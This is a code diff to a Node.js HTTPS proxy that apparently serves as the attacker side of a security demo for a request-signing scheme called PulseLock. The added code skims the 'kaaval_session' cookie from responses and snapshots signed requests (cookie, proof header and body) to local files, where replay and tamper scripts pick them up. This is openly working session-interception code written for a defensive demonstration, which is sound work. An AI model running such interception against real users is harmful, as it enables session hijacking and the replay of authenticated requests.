@@ -65,6 +65,14 @@ const BACKEND_PREFIXES = [
   "/health",
 ];
 
+// Capture files the attacker toolkit reads. The CLI scripts
+// (replay-cookie.js / tamper-request.js) and the web console (hacker-console.js)
+// all read these exact paths — the proxy is the single writer. Writing them is
+// best-effort: a failed write must never break the proxied request.
+const CAPTURE_COOKIE_FILE = path.join(__dirname, ".captured-cookie");
+const CAPTURE_ENVELOPE_FILE = path.join(__dirname, ".captured-envelope.json");
+const SESSION_COOKIE_NAME = "kaaval_session";
+
 const keyPath = path.join(CERT_DIR, `${CERT_NAME}-key.pem`);
 const certPath = path.join(CERT_DIR, `${CERT_NAME}.pem`);
 
@@ -108,6 +116,50 @@ function logCaptured(kind, req, headers) {
         cookies: setCookie,
       }),
     );
+    // Persist the freshest kaaval_session value so the attacker toolkit can
+    // replay it. Best-effort: never let a write failure disturb the response.
+    const cookieList = Array.isArray(setCookie) ? setCookie : [setCookie];
+    for (const raw of cookieList) {
+      const m = new RegExp(`${SESSION_COOKIE_NAME}=([^;\\s]+)`).exec(raw);
+      if (m) {
+        try {
+          fs.writeFileSync(CAPTURE_COOKIE_FILE, m[1], "utf8");
+          console.log(`[attacker-proxy] skimmed ${SESSION_COOKIE_NAME} -> .captured-cookie`);
+        } catch (err) {
+          console.error("[attacker-proxy] could not persist captured cookie:", err.message);
+        }
+      }
+    }
+  }
+}
+
+// When the victim's browser sends a PulseLock-signed request (the X-KAAVAL-Proof
+// header is present), snapshot the whole thing — cookie, proof and exact body —
+// into .captured-envelope.json in the shape tamper-request.js / hacker-console.js
+// expect. This is the "sniffed a complete signed request off the wire" step the
+// tamper and verbatim-replay scenes need. Best-effort; never blocks forwarding.
+function captureEnvelope(req, proof, bodyBuffer) {
+  try {
+    const cookieHeader = req.headers.cookie || "";
+    const m = new RegExp(`${SESSION_COOKIE_NAME}=([^;\\s]+)`).exec(cookieHeader);
+    let body = {};
+    try {
+      body = JSON.parse(bodyBuffer.toString("utf8") || "{}");
+    } catch {
+      body = {};
+    }
+    const envelope = {
+      base_url: BACKEND_TARGET,
+      path: req.url.split("?")[0],
+      mode: "protected",
+      cookie: m ? m[1] : null,
+      proof,
+      body,
+    };
+    fs.writeFileSync(CAPTURE_ENVELOPE_FILE, JSON.stringify(envelope, null, 2), "utf8");
+    console.log(`[attacker-proxy] skimmed signed request -> .captured-envelope.json (${envelope.path})`);
+  } catch (err) {
+    console.error("[attacker-proxy] could not persist captured envelope:", err.message);
   }
 }
 
@@ -152,7 +204,22 @@ const server = https.createServer(tlsOptions, (req, res) => {
     );
   });
 
-  req.pipe(upstream); // streams request bodies
+  // A PulseLock-signed request carries a proof header and a small JSON body:
+  // buffer it so we can snapshot the full envelope, then forward the same bytes.
+  // Everything else (GETs, SSE, the login POST, uploads) is streamed untouched.
+  const proof = req.headers["x-kaaval-proof"];
+  if (req.method === "POST" && typeof proof === "string" && proof.length > 0) {
+    const chunks = [];
+    req.on("data", (c) => chunks.push(c));
+    req.on("end", () => {
+      const bodyBuffer = Buffer.concat(chunks);
+      captureEnvelope(req, proof, bodyBuffer);
+      upstream.end(bodyBuffer);
+    });
+    req.on("error", () => upstream.destroy());
+  } else {
+    req.pipe(upstream); // streams request bodies
+  }
 });
 
 // Forward WebSocket upgrades (Next.js dev HMR) to the frontend so the demo
